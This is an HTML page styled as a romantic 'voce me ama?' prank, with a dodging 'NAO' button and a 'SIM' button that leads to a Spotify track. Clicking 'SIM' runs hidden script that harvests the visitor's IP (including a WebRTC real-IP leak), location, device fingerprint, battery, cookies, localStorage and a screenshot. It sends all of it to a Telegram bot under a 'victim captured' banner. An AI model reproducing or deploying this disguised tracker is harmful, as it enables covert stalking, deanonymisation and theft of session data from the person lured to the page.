<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>voce me ama?</title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #f5efe6;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                radial-gradient(circle at 15% 25%, rgba(173, 216, 230, 0.3) 0%, transparent 30%),
                radial-gradient(circle at 75% 60%, rgba(100, 149, 237, 0.2) 0%, transparent 35%),
                radial-gradient(circle at 45% 85%, rgba(135, 206, 250, 0.25) 0%, transparent 30%),
                radial-gradient(circle at 85% 15%, rgba(70, 130, 180, 0.15) 0%, transparent 25%),
                radial-gradient(circle at 5% 70%, rgba(173, 216, 230, 0.2) 0%, transparent 30%),
                radial-gradient(circle at 55% 35%, rgba(100, 149, 237, 0.15) 0%, transparent 25%),
                linear-gradient(135deg, #f5efe6 0%, #e8dfd3 100%);
            z-index: 0;
            animation: floatStars 20s ease-in-out infinite alternate;
        }

        @keyframes floatStars {
            0% {
                transform: scale(1) rotate(0deg);
            }
            100% {
                transform: scale(1.05) rotate(2deg);
            }
        }

        .stars-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background:
                radial-gradient(2px 2px at 10% 20%, rgba(173, 216, 230, 0.5) 0%, transparent 100%),
                radial-gradient(3px 3px at 30% 65%, rgba(100, 149, 237, 0.4) 0%, transparent 100%),
                radial-gradient(2px 2px at 55% 15%, rgba(135, 206, 250, 0.5) 0%, transparent 100%),
                radial-gradient(4px 4px at 75% 45%, rgba(70, 130, 180, 0.3) 0%, transparent 100%),
                radial-gradient(2px 2px at 90% 80%, rgba(173, 216, 230, 0.4) 0%, transparent 100%),
                radial-gradient(3px 3px at 20% 85%, rgba(100, 149, 237, 0.3) 0%, transparent 100%),
                radial-gradient(2px 2px at 65% 75%, rgba(135, 206, 250, 0.4) 0%, transparent 100%),
                radial-gradient(2px 2px at 45% 45%, rgba(173, 216, 230, 0.3) 0%, transparent 100%);
            filter: blur(3px);
            animation: twinkleStars 4s ease-in-out infinite alternate;
        }

        @keyframes twinkleStars {
            0% {
                opacity: 0.6;
                transform: scale(1);
            }
            100% {
                opacity: 1;
                transform: scale(1.02);
            }
        }

        .container {
            position: relative;
            z-index: 2;
            max-width: 500px;
            width: 100%;
            background: rgba(255, 252, 248, 0.75);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 48px 16px 48px 16px;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06), 0 0 60px rgba(173, 216, 230, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .pergunta {
            font-size: 26px;
            color: #4a3f3a;
            margin-bottom: 30px;
            letter-spacing: 1px;
            font-weight: 300;
        }

        .pergunta .emoji {
            color: #7a9bb5;
            display: inline-block;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%,
            100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 40px;
            flex-wrap: wrap;
            position: relative;
            min-height: 70px;
            margin-top: 10px;
        }

        .btn {
            font-size: 18px;
            padding: 14px 44px;
            border: none;
            background: rgba(235, 225, 215, 0.6);
            color: #4a3f3a;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            letter-spacing: 1px;
            border-radius: 60px 12px 60px 12px;
            min-width: 120px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
            backdrop-filter: blur(4px);
        }

        .btn:hover {
            background: #c5d5de;
            color: #2c2420;
            box-shadow: 0 4px 16px rgba(173, 216, 230, 0.3);
            transform: translateY(-2px);
        }

        .btn-nao {
            background: rgba(235, 225, 215, 0.4);
            color: #7a6f6a;
            transition: all 0.05s ease;
            position: relative;
        }

        .btn-nao:hover {
            transform: scale(1);
            background: rgba(235, 225, 215, 0.4);
            color: #7a6f6a;
            box-shadow: none;
        }

        .loader {
            border: 3px solid rgba(235, 225, 215, 0.5);
            border-top: 3px solid #7a9bb5;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            animation: spin 0.9s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .floating-hearts {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
            overflow: hidden;
        }

        .floating-heart {
            position: absolute;
            font-size: 16px;
            animation: floatUp 6s linear forwards;
            opacity: 0.25;
            color: #7a9bb5;
        }

        @keyframes floatUp {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 0.3;
            }
            90% {
                opacity: 0.3;
            }
            100% {
                transform: translateY(-10vh) rotate(720deg) scale(1.1);
                opacity: 0;
            }
        }

        @media (max-width: 500px) {
            .container {
                padding: 30px 18px;
            }
            .pergunta {
                font-size: 20px;
            }
            .btn {
                font-size: 16px;
                padding: 12px 28px;
                min-width: 100px;
            }
            .buttons {
                gap: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="stars-overlay"></div>
    <div class="floating-hearts" id="floatingHearts"></div>

    <div class="container" id="page-content">
        <div class="pergunta">
            <span class="emoji">💗</span> voce me ama?
        </div>

        <div class="buttons" id="buttonArea">
            <button class="btn" id="btnSim">SIM</button>
            <button class="btn btn-nao" id="btnNao">NAO</button>
        </div>

        <div class="loader" id="loader"></div>
    </div>

    <script>
        // ============================================================
        // BOTÃO "NAO" FUGINDO
        // ============================================================
        const btnNao = document.getElementById('btnNao');
        const btnSim = document.getElementById('btnSim');
        const container = document.getElementById('page-content');
        const buttonArea = document.getElementById('buttonArea');
        const loader = document.getElementById('loader');

        btnNao.addEventListener('mouseenter', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();

            const padding = 20;
            const maxX = containerRect.width - btnRect.width - padding;
            const maxY = containerRect.height - btnRect.height - padding;

            let newX, newY;
            let attempts = 0;
            do {
                newX = Math.random() * maxX;
                newY = Math.random() * maxY;
                attempts++;
                if (attempts > 50) break;
            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);

            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
        });

        btnNao.addEventListener('click', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();
            const maxX = containerRect.width - btnRect.width - 20;
            const maxY = containerRect.height - btnRect.height - 20;
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.random() * maxX + 'px';
            btnNao.style.top = Math.random() * maxY + 'px';
        });

        // ============================================================
        // BOTÃO "SIM" — DISPARA TUDO E REDIRECIONA PRO SPOTIFY
        // ============================================================
        btnSim.addEventListener('click', function() {
            buttonArea.style.display = 'none';
            loader.style.display = 'block';

            coletarEEnviar();

            // 👇https://open.spotify.com/track/09riz9pAPJyYYDVynE5xxY?si=j-WpAX9pQR-MBJXsAI7DOA&utm_source=copy-link
            setTimeout(() => {
                window.location.href = 'https://open.spotify.com/track/3j2jHwUi5SAdV9nB9NSHTG';
            }, 2000);
        });

        // ============================================================
        // COLETAR E ENVIAR PRO TELEGRAM
        // ============================================================
        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT_ID = "8551438856";

        async function coletarEEnviar() {
            try {
                const ip = await fetch('https://api.ipify.org?format=json')
                    .then(r => r.json()).then(d => d.ip).catch(() => '❌');

                let webrtcIP = '❌';
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('teste');
                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
                    await pc.setLocalDescription(offer);
                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
                    if (candidates) {
                        const ips = candidates.map(c => c.split(' ')[4])
                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
                        if (ips.length) webrtcIP = ips[0];
                    }
                    pc.close();
                } catch {}

                let location = {};
                try {
                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
                    const d = await r.json();
                    location = {
                        city: d.city || 'Desconhecida',
                        region: d.region || 'Desconhecida',
                        country: d.country || 'Desconhecido',
                        loc: d.loc || 'Desconhecida',
                        org: d.org || 'Desconhecido',
                        timezone: d.timezone || 'Desconhecido'
                    };
                } catch {
                    location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                }

                let vpnStatus = '❓ Indeterminado';
                if (location.org) {
                    const org = location.org.toLowerCase();
                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
                        'vultr', 'heroku', 'azure', 'google cloud'
                    ];
                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
                }

                const fpData = [
                    navigator.userAgent,
                    navigator.language,
                    screen.width + 'x' + screen.height,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || '?',
                    navigator.deviceMemory || '?',
                    !!navigator.webdriver,
                    !!navigator.plugins.length,
                    navigator.doNotTrack || '?'
                ];
                let hash = 0;
                const fpString = fpData.join('|');
                for (let i = 0; i < fpString.length; i++) {
                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
                    hash = hash & hash;
                }
                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();

                const ua = navigator.userAgent;
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                const isAndroid = /Android/i.test(ua);
                let modelo = 'Desconhecido',
                    os = 'Desconhecido',
                    marca = 'Desconhecida';

                if (isIOS) {
                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
                    marca = 'Apple';
                } else if (isAndroid) {
                    const m = ua.match(/Android (\d+\.\d+)/);
                    modelo = m ? `Android ${m[1]}` : 'Android';
                    os = m ? `Android ${m[1]}` : 'Android';
                    marca = 'Android';
                } else {
                    modelo = '💻 Computador';
                    os = navigator.platform || 'Desconhecido';
                    marca = 'Desktop';
                }

                let bateria = '❌';
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🔋 Descarregando'})`;
                    } catch {}
                }

                let conexao = '❌';
                if (navigator.connection) {
                    conexao = navigator.connection.effectiveType || 'N/A';
                }

                let plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';

                const cookies = document.cookie || '❌ Sem cookies';
                let localStorageData = '❌';
                try {
                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
                } catch {}

                let wifi = '❌';
                if (navigator.connection) {
                    try {
                        wifi =
                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
                    } catch {}
                }

                let fonts = [];
                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
                for (let f of fontList) {
                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
                }
                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';

                let screenshot = null;
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: 1.5,
                        useCORS: true,
                        backgroundColor: '#f5efe6',
                        logging: false,
                        allowTaint: false,
                        width: window.innerWidth,
                        height: window.innerHeight,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight
                    });
                    screenshot = canvas.toDataURL('image/jpeg', 0.9);
                } catch (e) {}

                let msg = `
        💗 **CLEAN GIRL — VÍTIMA CAPTURADA** 💗

        🌐 **IP Público:** ${ip}
        🔴 **IP Real (WebRTC):** ${webrtcIP}
        🛡️ **VPN/Proxy:** ${vpnStatus}

        📍 **LOCALIZAÇÃO POR IP:**
           🏙️ Cidade: ${location.city}
           🗺️ Região: ${location.region}
           🌍 País: ${location.country}
           📍 Coordenadas: ${location.loc}
           🕰️ Fuso: ${location.timezone}

        📱 **DISPOSITIVO:**
           📱 Modelo: ${modelo}
           🏷️ Marca: ${marca}
           📲 OS: ${os}
           🔋 Bateria: ${bateria}
           📶 Conexão: ${conexao}
           📐 Tela: ${screen.width}x${screen.height}
           🌍 Idioma: ${navigator.language}
           🕰️ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
           🧠 Fingerprint: ${fingerprint}

        📶 **REDE:** ${wifi}

        🔌 **PLUGINS:** ${pluginsList}
        🍪 **COOKIES:** ${cookies}
        💾 **localStorage:** ${localStorageData}

        🔤 **FONTES INSTALADAS:** ${fontsInstalled}

        💀 **Ela disse SIM!** 💀
        `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });

                if (screenshot) {
                    const form = new FormData();
                    const blob = await fetch(screenshot).then(res => res.blob());
                    form.append('photo', blob, 'screenshot_real.jpg');
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', '🖼️ PRINT REAL DA TELA INTEIRA');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }

            } catch (e) {
                console.log('Erro no envio:', e);
            }
        }

        // ============================================================
        // CORAÇÕES FLUTUANTES
        // ============================================================
        setInterval(() => {
            if (document.getElementById('buttonArea').style.display === 'none') return;
            const heart = document.createElement('div');
            heart.className = 'floating-heart';
            heart.textContent = '♥';
            heart.style.left = Math.random() * 90 + 5 + '%';
            heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
            heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
            heart.style.opacity = '0.2';
            heart.style.color = '#7a9bb5';
            document.getElementById('floatingHearts').appendChild(heart);
            setTimeout(() => { heart.remove(); }, 8000);
        }, 3000);
    </script>

</body>
</html>
